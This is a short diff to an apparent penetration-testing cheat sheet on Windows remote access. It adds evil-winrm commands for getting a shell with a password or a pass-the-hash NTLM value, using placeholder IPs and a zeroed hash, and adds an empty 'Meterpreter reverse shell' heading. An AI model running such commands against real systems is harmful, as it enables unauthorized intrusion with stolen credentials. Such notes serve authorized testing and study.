@@ -26,7 +26,8 @@ Enter-PSSession 1                                                               
 ## Evil-winrm
 Linux tool to access a remote system via WinRM and obtain a shell.
 ``` bash
-evil-winrm -i 192.168.163.249 -u 'username' -p 'password'
+evil-winrm -i 192.168.1.1 -u 'username' -p 'password'
+evil-winrm -i 192.168.1.1 -u 'username' -H '00000000000000000000000000000000'
 ```
 
 ## PsExec64
@@ -36,3 +37,4 @@ evil-winrm -i 192.168.163.249 -u 'username' -p 'password'
 ```
 
 ## Meterpreter reverse shell (1)
+...
